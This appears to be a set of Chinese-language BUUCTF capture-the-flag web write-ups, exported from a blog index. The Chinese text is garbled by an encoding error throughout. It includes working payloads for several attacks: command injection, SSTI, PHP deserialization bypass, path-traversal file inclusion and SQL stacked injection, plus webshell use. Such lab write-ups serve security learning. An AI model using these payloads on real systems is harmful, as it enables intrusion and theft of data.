æ˜¾ç„¶ï¼Œç½‘é¡µå¯¹äºç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰åšå‡ºä»»ä½•è¿‡æ»¤ã€‚äºæ˜¯æˆ‘ä»¬ç”¨findå·¥å…·æ‰¾å‡ºflagçš„ä½ç½®(/flag)å¹¶ä¸”ç›´æ¥æ˜¾ç¤ºå³å¯ã€‚ 127.0.0.1;find / -name flag* /* .... ... /flag */ cat /flag psï¼šè¿™æ˜¯ç¬¬ä¸€ä¸ªæˆ‘æ²¡çœ‹ä»»ä½•wpè‡ªå·±å†™å‡ºçš„webé¢˜ğŸ˜­ï¼Œä¸å®¹æ˜“å•Š ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:2:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x09-actf2020-æ–°ç”Ÿèµ›exec"},{"categories":["CTF"],"content":"0x10 [æå®¢å¤§æŒ‘æˆ˜ 2019]Knife é¢˜ç›®é“¾æ¥ ç½‘é¡µæ ‡é¢˜ç›´æ¥å‘Šè¯‰ä½ è¿™æ˜¯ç™½ç»™çš„shellï¼Œå†çœ‹åˆ°evalä¸€å¥è¯æœ¨é©¬ï¼Œå°±æ˜ç™½è¿™æ˜¯webshellã€‚ image-20210304110445313image-20210304110445313 \" image-20210304110445313 ç”¨èšå‰‘ç›´æ¥è¾“å…¥ç½‘é¡µåœ°å€å’Œå¯†ç Sycå°è¯•è¿æ¥ï¼Œè™½ç„¶ç»ˆç«¯é‡Œfind / -name flagæ²¡æœ‰æ‰¾åˆ°ç»“æœï¼Œä½†æ˜¯åœ¨å›¾å½¢ç•Œé¢é‡Œå‘ç°æ ¹ç›®å½•ä¸‹å­˜åœ¨flagæ–‡ä»¶ï¼Œç›´æ¥ç™½ç»™ã€‚ä¸è¿‡å¥‡æ€ªçš„æ˜¯ä¸ºä»€ä¹ˆå‘½ä»¤è¡Œfindæ²¡æœ‰æ‰¾åˆ°ï¼Ÿ image-20210304111608479image-20210304111608479 \" image-20210304111608479 ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:3:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x10-æå®¢å¤§æŒ‘æˆ˜-2019knife"},{"categories":["CTF"],"content":"0x11 [æŠ¤ç½‘æ¯ 2018]easy_tornado é¢˜ç›®é“¾æ¥ tornadoæ˜¯ä¸€ä¸ªPythonç¼–å†™çš„å¼‚æ­¥åç«¯æ¡†æ¶ï¼Œè¿™é¢˜æ—¢ç„¶æ˜¯è¿™ä¸ªåå­—ï¼Œé‚£ä¹ˆè‚¯å®šä¸tornadoçš„æŸäº›ç‰¹æ€§ç›¸å…³ã€‚ æ¥ä¸‹æ¥çœ‹é¢˜ï¼Œç½‘é¡µç»™å‡ºäº†ä¸‰ä¸ªé“¾æ¥ï¼Œåˆ†åˆ«æ˜¯/flag.txt//welcome.txt//hints.txtã€‚ æŸ¥çœ‹flag.txtï¼ŒçŸ¥é“äº†flagå†…å®¹åœ¨/fllllllllllllagé‡Œã€‚ å†æŸ¥çœ‹hints.txtï¼Œä»¥åŠç»“åˆè®¿é—®æ—¶çš„ç½‘å€å¯ä»¥çŸ¥é“ï¼ŒæœåŠ¡ç«¯åœ¨æ¥æ”¶åˆ°è®¿é—®æ–‡ä»¶è¯·æ±‚æ—¶ï¼Œä¼šä»¥å¦‚ä¸‹æ–¹å¼è®¡ç®—å“ˆå¸Œæ ¡éªŒå€¼ï¼Œä¸è¯·æ±‚ä¸­çš„å“ˆå¸Œå€¼å‚æ•°ä¸€è‡´æ‰èƒ½è®¿é—®ã€‚é‚£ä¹ˆé—®é¢˜å°±åªå‰©ä¸‹æ‰¾å‡ºè¿™ä¸ªcookie_secretäº†ã€‚ image-20210304114118622image-20210304114118622 \" image-20210304114118622 æ³¨æ„åˆ°ç›´æ¥è®¿é—®flagæ–‡ä»¶æ—¶ï¼Œé¡µé¢æ˜¾ç¤ºErrorå¹¶ä¸”ç½‘å€ä¸­çš„msgå‚æ•°ä¹Ÿæ˜¯Errorï¼Œæ‰€ä»¥è¿™é¢˜åº”è¯¥æ˜¯é€šè¿‡SSTI(æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥)æ”»å‡»æ¥è·å–cookie_secretã€‚ image-20210304134904282image-20210304134904282 \" image-20210304134904282 æŸ¥é˜…èµ„æ–™å¯çŸ¥ï¼Œhandler.settingså¯¹è±¡ä¸­åŒ…å«æœ‰cookie_secretå€¼ã€‚æ‰€ä»¥ï¼Œç›´æ¥è®¿é—®error?msg={{handler.settings}}ã€‚ image-20210304135247316image-20210304135247316 \" image-20210304135247316 ç„¶åå°†/fllllllllllllagä»£å…¥ï¼Œè®¡ç®— md5(cookie_secret+md5('/fllllllllllllag')) å¡«å…¥åˆ°é“¾æ¥ä¸­è®¿é—®å³å¯ image-20210304135749480image-20210304135749480 \" image-20210304135749480 å‚è€ƒé“¾æ¥ï¼š https://blog.csdn.net/zz_Caleb/article/details/101473013 https://blog.csdn.net/zz_Caleb/article/details/96480967 https://www.tornadoweb.org/en/latest/guide/templates.html#template-syntax ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:4:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x11-æŠ¤ç½‘æ¯-2018easy_tornado"},{"categories":["CTF"],"content":"0x12 [RoarCTF 2019]Easy Cal é¢˜ç›®é“¾æ¥ çŸ¥è¯†ç‚¹ï¼š phpçš„eval()å‡½æ•°ï¼Œå°†å‚æ•°ä½œä¸ºphpå‘½ä»¤æ‰§è¡Œ ç©ºæ ¼ç»•è¿‡æŸäº›waf phpçš„var_dump()/scandir()/file_get_contents()ç›¸å…³å‡½æ•° è®¡ç®—å™¨åŠŸèƒ½æ˜¯é€šè¿‡å‘calc.phpå‘èµ·è¯·æ±‚æ¥å®ç°çš„ã€‚ image-20210305101604030image-20210305101604030 \" image-20210305101604030 æŸ¥çœ‹calc.phpå†…å®¹ \u003c?php error_reporting(0); if(!isset($_GET['num'])){ show_source(__FILE__); }else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(\"what are you want to do?\"); } } eval('echo '.$str.';'); } ?\u003e åœ¨numå‚æ•°å‰åŠ ä¸Šä¸€ä¸ªç©ºæ ¼ï¼Œå¯ä»¥ç»•è¿‡æœåŠ¡ç«¯çš„wafï¼Œå¹¶ä¸”ä½¿å¾—phpæ­£ç¡®è§£æã€‚ ä½¿ç”¨scandir()å‡½æ•°æŸ¥æ‰¾flagæ–‡ä»¶ï¼Œå‘ç°f1aggï¼ˆæ³¨æ„è¿™é‡Œæ˜¯1ï¼‰ã€‚ image-20210305111041608image-20210305111041608 \" image-20210305111041608 æŸ¥çœ‹flagå†…å®¹ã€‚ image-20210305110959804image-20210305110959804 \" image-20210305110959804 å‚è€ƒé“¾æ¥ï¼š BUUCTF WEB [RoarCTF 2019]Easy Calc httpèµ°ç§æ”»å‡» ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:5:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x12-roarctf-2019easy-cal"},{"categories":["CTF"],"content":"0x13 [æå®¢å¤§æŒ‘æˆ˜ 2019]Http ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:6:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x13-æå®¢å¤§æŒ‘æˆ˜-2019http"},{"categories":["CTF"],"content":"0x14 [æå®¢å¤§æŒ‘æˆ˜ 2019]PHP é¢˜ç›®é“¾æ¥ çŸ¥è¯†ç‚¹ï¼š phpåºåˆ—åŒ–serialize()ä¸ååºåˆ—åŒ–unserialize() phpé­”æœ¯æ–¹æ³•ï¼ˆç±»ä¼¼äºé’©å­å‡½æ•°çš„æ¦‚å¿µï¼‰ï¼Œæ¯”å¦‚__wakeup()ç­‰ ç½‘ç«™ç›®å½•æ‰«æå·¥å…·ä¸ä½¿ç”¨ CVE-2016-1724 ååºåˆ—åŒ–æ—¶ç»•è¿‡__wakeup()æ–¹æ³• image-20210305162352227image-20210305162352227 \" image-20210305162352227 ç½‘é¡µä»€ä¹ˆä¹Ÿæ²¡ç»™ï¼Œä½†æ˜¯å‘Šè¯‰ä½ æœ‰ç½‘ç«™å¤‡ä»½ï¼Œæ‰€ä»¥è¦æƒ³åˆ°ç½‘ç«™ç›®å½•æ‰«æã€‚ é¦–å…ˆä½¿ç”¨dirsearchæˆ–è€…hackbaræˆ–è€…å…¶ä»–å·¥å…·ï¼Œæ‰«æç½‘ç«™ï¼Œå¾—åˆ°å¤‡ä»½æ–‡ä»¶/www.zipï¼ˆç„¶è€Œæˆ‘å®é™…ä½¿ç”¨å¹¶æ²¡æœ‰æ‰«å‡ºæ¥ï¼Œä¸çŸ¥é“å“ªé‡Œå‡ºäº†é—®é¢˜â€¦ï¼‰ è§£å‹ï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹æ–‡ä»¶ filesfiles \" files åˆ†æindex.phpå¯çŸ¥ï¼Œç½‘é¡µè·å–selectå‚æ•°ï¼Œå¹¶å°†å…¶ååºåˆ—åŒ–ã€‚ å†æŸ¥çœ‹class.php \u003c?php include 'flag.php'; error_reporting(0); class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-\u003eusername = $username; $this-\u003epassword = $password; } function __wakeup(){ $this-\u003eusername = 'guest'; } function __destruct(){ if ($this-\u003epassword != 100) { echo \"\u003c/br\u003eNO!!!hacker!!!\u003c/br\u003e\"; echo \"You name is: \"; echo $this-\u003eusername;echo \"\u003c/br\u003e\"; echo \"You password is: \"; echo $this-\u003epassword;echo \"\u003c/br\u003e\"; die(); } if ($this-\u003eusername === 'admin') { global $flag; echo $flag; }else{ echo \"\u003c/br\u003ehello my friend~~\u003c/br\u003esorry i can't give you the flag!\"; die(); } } } ?\u003e å‘ç°class.phpä¸­çš„ç±»ææ„å‡½æ•°__destruct()ä¸­çš„ä¸€ä¸ªé€»è¾‘èƒ½å¤Ÿæ˜¾ç¤ºflagã€‚äºæ˜¯æ•´ä½“æ€è·¯å°±æ¯”è¾ƒæ¸…æ¥šäº†ï¼šindex.phpåœ¨è·å–selectå‚æ•°ä¹‹åå°†å…¶ååºåˆ—åŒ–ï¼Œè·å¾—ä¸€ä¸ªNameå¯¹è±¡ï¼Œè¯¥å¯¹è±¡æœ€åä¼šè¢«é”€æ¯ã€‚åªè¦å¯¹è±¡åœ¨è¢«é”€æ¯æ—¶ï¼Œå…¶__destruct()å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­åˆ¤æ–­usernameå’Œpasswordåˆ†åˆ«ä¸º\"admin\"å’Œ100å³å¯åœ¨é¡µé¢æ˜¾ç¤ºflagã€‚ æ¥ä¸‹æ¥å°±æ˜¯phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„çŸ¥è¯†ã€‚ é¦–å…ˆåºåˆ—åŒ–ä¸€ä¸ªusernameå’Œpasswordç¬¦åˆè¦æ±‚çš„å¯¹è±¡ï¼Œå…¶ç»“æœä¸º O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;} \"Nameusername\"å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º12ï¼Œä½†æ˜¯ç»“æœå´æ˜¾ç¤ºçš„14ã€‚è¿™æ˜¯å› ä¸ºusernameå±æ€§ä¸ºprivateï¼Œprivateç±»å‹çš„æˆå‘˜å˜é‡åœ¨åºåˆ—åŒ–æ—¶ï¼Œå˜é‡åä¸­ä¼šåŠ ä¸Šç±»åå’Œä¸¤ä¸ªä¸å¯è§å­—ç¬¦(\\0)ï¼Œå› æ­¤passwordä¹ŸåŒç†ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬å‘é€çš„è¯·æ±‚ä¸­çš„selectå‚æ•°åº”ä¸º(%00è¡¨ç¤ºä¸å¯è§å­—ç¬¦) O:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} ç„¶è€Œclass.phpä¸­æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³•__wakeup()ï¼Œå®ƒå°†usernameå˜é‡èµ‹å€¼ä¸º\"guest\"ï¼Œä½¿å¾—æ— æ³•é€šè¿‡ä¹‹åæ˜¾ç¤ºflagçš„åˆ¤æ–­é€»è¾‘ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå®ƒä¼šåœ¨ååºåˆ—åŒ–å‡½æ•°unserialize()æ„é€ å®Œå¯¹è±¡ä¹‹åæ‰§è¡Œã€‚ è‹¥è¢«ååºåˆ—åŒ–çš„å˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æˆåŠŸåœ°é‡æ–°æ„é€ å¯¹è±¡ä¹‹åï¼ŒPHP ä¼šè‡ªåŠ¨åœ°è¯•å›¾å»è°ƒç”¨ __wakeup() æˆå‘˜å‡½æ•°ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰ã€‚ æ‰€ä»¥ï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡__wakeup()å‡½æ•°ã€‚è¿™å°±æ˜¯CVE-2016-1724çš„å†…å®¹ã€‚ å½“è¢«ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å±æ€§ä¸ªæ•°å¤§äºå¯¹è±¡æœ¬èº«çš„å±æ€§ä¸ªæ•°æ—¶ï¼Œ__wakeup()å‡½æ•°ä¼šè¢«ç»•è¿‡ä¸è¢«æ‰§è¡Œã€‚ æ‰€ä»¥ï¼Œæœ€ç»ˆæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„è¯·æ±‚å‚æ•°ä¸º O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} image-20210305162217584image-20210305162217584 \" image-20210305162217584 https://www.shuzhiduo.com/A/KE5QrVD4dL/ https://www.cnblogs.com/wangtanzhi/p/12193930.html phpååºåˆ—åŒ–å‡½æ•° ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:7:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x14-æå®¢å¤§æŒ‘æˆ˜-2019php"},{"categories":["CTF"],"content":"0x00 [HCTF 2018]WarmUp é¢˜ç›®é“¾æ¥ å¼•å…¥çœ¼å¸˜çš„æ˜¯ä¸ªæ»‘ç¨½ğŸ¤” image-20210226211946197image-20210226211946197 \" image-20210226211946197 F12çœ‹æºç ï¼Œå‘ç°é¡µé¢æ³¨é‡Šé‡Œæç¤ºæºç åœ¨source.phpã€‚ // source.php \u003c?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026$page) { $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\u003cbr\u003e\u003cimg src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\"/\u003e\"; } ?\u003e ä»source.phpä¸­è¿˜å¯ä»¥çœ‹åˆ°hint.phpä¹ŸåŒ…å«ä¸€äº›ä¿¡æ¯ã€‚ $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } æŸ¥çœ‹hint.phpï¼Œç»“æœæ˜¾ç¤ºflagå†…å®¹åœ¨ffffllllaaaaggggã€‚ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶ï¼Œå‘ç°æ— æ³•è®¿é—®ï¼ˆå½“ç„¶æ²¡è¿™ä¹ˆç®€å•äº†ï¼‰ image-20210226212604043image-20210226212604043 \" image-20210226212604043 å†ç»§ç»­åˆ†æsource.phpï¼Œgetçš„fileå‚æ•°è¦éç©ºã€ä¸ºå­—ç¬¦ä¸²ä¸”é€šè¿‡checkFile()å‡½æ•°åˆ¤æ–­ï¼Œæ‰èƒ½è¿›å…¥åˆ°includeé€»è¾‘ã€‚ if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\u003cbr\u003e\u003cimg src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\"/\u003e\"; } é‚£å°±æ¥çœ‹checkFile()å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›trueçš„åœ°æ–¹ä¸€å…±æœ‰3å¤„ã€‚ é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªç™½åå•ã€‚è¯·æ±‚çš„æ–‡ä»¶ååœ¨ç™½åå•ä¸­å³è¿”å›trueï¼Œå¯¹åº”äºä¹‹å‰æåˆ°çš„source.phpå’Œhint.phpã€‚æ˜¾ç„¶è¿™ä¸ªé€»è¾‘æ— æ³•è¢«ç”¨æ¥è¯»å–flagã€‚ $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } ç¬¬äºŒä¸ªé€»è¾‘ä¸­ï¼Œå‚æ•°é¦–å…ˆè¢«æ ¹æ®?å­—ç¬¦è¿›è¡Œæˆªå–ï¼Œæˆªå–åçš„å†…å®¹å¦‚æœåœ¨ç™½åå•ä¸­åˆ™è¿”å›trueã€‚è¿™ä¸ªä¹Ÿæ— æ³•è¢«ç”¨æ¥è¯»å–flagã€‚ ç›¸å…³å‡½æ•°ï¼šmb_strpos()ã€mb_substr() $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } å†çœ‹æœ€åä¸€ä¸ªè¿”å›trueçš„é€»è¾‘ã€‚å‘ç°å…¶å…ˆå°†getè¯·æ±‚ä¸­çš„fileå‚æ•°è¿›è¡Œä¸€æ¬¡URLè§£ç ï¼Œç„¶åå†å»æˆªå–?å‰çš„å†…å®¹ï¼Œåˆ¤æ–­æ˜¯å¦åœ¨ç™½åå•å†…ã€‚åŒæ—¶ï¼Œphpåœ¨è¯»å–$_REQUEST['file']å‚æ•°çš„æ—¶å€™ï¼Œå°±ä¼šè¿›è¡Œä¸€æ¬¡URLè§£ç ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨åœ°å€ä¸­åŠ å…¥?ç»è¿‡ä¸¤æ¬¡URLç¼–ç ä¹‹åçš„å†…å®¹%253få³å¯é€šè¿‡å‡½æ•°éªŒè¯ï¼Œå¹¶ä¸”ä½¿å¾—å‚æ•°åœ¨ç»è¿‡ä¸€æ¬¡URLè§£ç ä¹‹åä¸å«?ï¼Œä¹Ÿå°±ä¸ä¼šè¢«å½“ä½œå…¶ä»–getè¯·æ±‚çš„å‚æ•°ã€‚ $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } æ‰€ä»¥ï¼Œå¯ä»¥æ„é€ payloadã€‚é€çº§æ·»åŠ ../ï¼Œæ‰¾åˆ°ffffllllaaaaggggæ–‡ä»¶è·¯å¾„æ‰€åœ¨ã€‚ ?file=source.php%253f/../../../../ffffllllaaaagggg image-20210226210928641image-20210226210928641 \" image-20210226210928641 æœ€åç»“è®ºï¼šæˆ‘ä¸€å¼€å§‹çœ‹åˆ°warmupå‡ ä¸ªå¤§å­—ï¼Œè¿˜ä»¥ä¸ºç›´æ¥F12ï¼Œç„¶åflagåˆ†ä¸ºå‡ æ®µæ”¾åœ¨æºç é‡Œâ€¦ğŸ¤£ğŸ¤£ï¼Œpicoå…¥é—¨é¢˜çœŸæ˜¯å®³äººä¸æµ…å•Šã€‚ ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½•","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x00-hctf-2018warmup"},{"categories":["CTF"],"content":"0x01 [æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL é¢˜ç›®é“¾æ¥ ç®€å•çš„æ³¨å…¥ï¼Œç”¨æˆ·åè¾“å…¥admin' or '1'='1' #ï¼Œå¯†ç éšä¾¿è¾“å³å¯ã€‚ image-20210227161029874image-20210227161029874 \" image-20210227161029874 ä½†æ˜¯æŠŠ#æ¢æˆ--å°±ä¸è¡Œï¼Œæš‚æ—¶è¿˜ä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ ç™»å½•ä¹‹åæ‹¿åˆ°flag image-20210227161238808image-20210227161238808 \" image-20210227161238808 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½•","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x01-æå®¢å¤§æŒ‘æˆ˜-2019easysql"},{"categories":["CTF"],"content":"0x02 [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ ç½‘é¡µæä¾›äº†ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œç‚¹å‡»æäº¤å°†ä¼šå‘å‡ºgetè¯·æ±‚ï¼Œå‚æ•°ä¸ºinject=[è¾“å…¥çš„å†…å®¹]ã€‚çœ‹æºç ï¼Œæ³¨é‡Šé‡Œæç¤ºâ€œsqlmapæ˜¯æ²¡æœ‰çµé­‚çš„â€ã€‚ æˆ‘çš„å°è¯•ï¼š æäº¤admin' or '1'='1' #ï¼Œç»“æœé¡µé¢ä¸Šæ˜¾ç¤ºè¿™äº›ä¸œè¥¿ã€‚ array(2) { [0]=\u003e string(1) \"1\" [1]=\u003e string(7) \"hahahah\" } array(2) { [0]=\u003e string(1) \"2\" [1]=\u003e string(12) \"miaomiaomiao\" } array(2) { [0]=\u003e string(6) \"114514\" [1]=\u003e string(2) \"ys\" } æ˜¾ç„¶ï¼Œè¿™åº”è¯¥æ˜¯æŸ¥è¯¢è¯­å¥æ‰€ä½œç”¨çš„è¡¨çš„æ‰€æœ‰è®°å½•ï¼Œä¸€å…±æœ‰3æ¡ã€‚ ä¸ºäº†æ‰¾åˆ°flagï¼Œä½¿ç”¨å †å æ³¨å…¥ï¼Œè¾“å…¥1';show tables;#ï¼ŒæŸ¥è¯¢æ‰€æœ‰è¡¨åã€‚å‘ç°å­˜åœ¨wordså’Œ1919810931114514ä¸¤ä¸ªè¡¨ã€‚ image1image1 \" image1 å†ä½¿ç”¨descæŸ¥çœ‹ä¸¤ä¸ªè¡¨çš„ç»“æ„ï¼Œè¾“å…¥1';desc wordsï¼Œ1';desc 1919810931114514;# ã€‚è¿™é‡Œæœ‰ä¸ªå°trickï¼Œä½¿ç”¨çº¯æ•°å­—è¡¨å è¦åœ¨è¡¨åå‰ååŠ ä¸Š ``(è¿™é‡Œç”±äºmarkdownæ— æ³•è½¬ä¹‰çš„é—®é¢˜ï¼Œæ‰€ä»¥æ²¡æœ‰åŠ å…¥åˆ°è¡Œå†…ä»£ç å—ä¸­ï¼Œå®é™…è¾“å…¥è¦åœ¨æ•°å­—å‰ååŠ ä¸Š)ã€‚å¯ä»¥çœ‹åˆ°flagå†…å®¹ä½äº1919810931114514è¡¨ä¸­ã€‚ image2image2 \" image2 image3image3 \" image3 æ¥ä¸‹æ¥è¦æƒ³åŠæ³•æŸ¥è¯¢åˆ°è¯¥è¡¨ä¸­çš„flagå†…å®¹ã€‚ç›´æ¥å †å æ³¨å…¥æŸ¥è¯¢è¯­å¥ï¼Œä¼šå‘ç°selectç­‰å…³é”®å­—éƒ½è¢«è¿‡æ»¤æ‰äº†ã€‚ image-20210227202949683image-20210227202949683 \" image-20210227202949683 äºæ˜¯æœ‰ä¸¤ç§æ€è·¯ ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:3:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½•","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x02-å¼ºç½‘æ¯-2019éšä¾¿æ³¨"},{"categories":["CTF"],"content":"æ€è·¯1 ä½¿ç”¨MySqlçš„prepareåŠŸèƒ½ï¼Œè¿™æ˜¯ä¸€ä¸ªç±»ä¼¼äºè®¡åˆ’ä»»åŠ¡çš„åŠŸèƒ½ã€‚å°†selectæŸ¥è¯¢è¯­å¥è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œç„¶åprepareâ€¦fromâ€¦æ¥æ‰§è¡Œè¯¥è¯­å¥ã€‚ 1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:3:1","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½•","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#æ€è·¯1"},{"categories":["CTF"],"content":"æ€è·¯2 ç›´æ¥ä¿®æ”¹è¡¨çš„åå­—ï¼Œrename/alterç­‰å…³é”®å­—æ˜¯æ²¡æœ‰è¢«ç­›é€‰çš„ï¼Œæ‰€ä»¥å¯ä»¥è¢«è¾“å…¥æ‰§è¡Œã€‚å…ˆå°†wordsè¡¨åæ”¹ä¸ºå…¶ä»–åå­—ï¼Œå†å°†1919810931114514è¡¨åæ”¹ä¸ºwordsã€‚å› ä¸ºå½“å‰é¡µé¢çš„æŸ¥è¯¢å¯¹è±¡å°±æ˜¯è¡¨wordsï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿›è¡ŒæŸ¥è¯¢ã€‚ 1';rename table `words` to `123`;rename table `1919810931114514` to `words`;alter table `words` add id int(10);# 1'or1=1# ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:3:2","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½•","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#æ€è·¯2"},{"categories":["CTF"],"content":"0x03 [æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun é¢˜ç›®é“¾æ¥ ç•Œé¢è¿˜æŒºå¥½çœ‹çš„ image-20210227205837574image-20210227205837574 \" image-20210227205837574 æºç ä¸­æœ‰è¿™ä¹ˆä¸€æ®µæ³¨é‡Š äºæ˜¯å°è¯•getè¯·æ±‚å¹¶ä¸”catå‚æ•°ä¸ºdogï¼Œç»“æœå°±å‡ºflagäº†â€¦ğŸ˜“ image-20210227210208421image-20210227210208421 \" image-20210227210208421 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:4:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½•","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x03-æå®¢å¤§æŒ‘æˆ˜-2019havefun"},{"categories":["CTF"],"content":"0x04 [SUCTF 2019]EasySQL é¢˜ç›®é“¾æ¥ è¾“å…¥1';show tables;#ï¼Œæ²¡ååº”ï¼Œè¾“å…¥1;show tables;#ï¼ŒæŸ¥è¯¢åˆ°æœ‰ä¸€ä¸ªFlagè¡¨ã€‚ æ¥ä¸‹æ¥è‚¯å®šå°±æ˜¯æƒ³åŠæ³•è·å–Flagè¡¨ä¸­çš„å†…å®¹äº†ã€‚ ç›´æ¥è¾“å…¥1;select * from Flag;ï¼Œå‘ç°ä¸è®©ä½ æŸ¥è¯¢ï¼Œé‚£è‚¯å®šæ˜¯è¿‡æ»¤äº†selectç­‰å…³é”®å­—ã€‚ æ¥ä¸‹æ¥å°±æ˜¯å­¦ä¹ åˆ«äººçš„wpäº†ğŸ˜…ã€‚ æ®è¯´è¿™é¢˜æ¯”èµ›çš„æ—¶å€™ç»™äº†æºç ï¼ŒæŸ¥è¯¢è¯­å¥ä¸º select$_GET['query']||flagfromFlag äºæ˜¯ï¼Œå¯ä»¥è¾“å…¥*,1ï¼Œä½¿å¾—è¢«æ‰§è¡Œçš„æŸ¥è¯¢è¯­å¥ä¸ºselect *,1||flag from Flagï¼Œä¹Ÿå°±æ˜¯select *,1 from flagã€‚ä»è€Œè·å–flagå†…å®¹ã€‚ 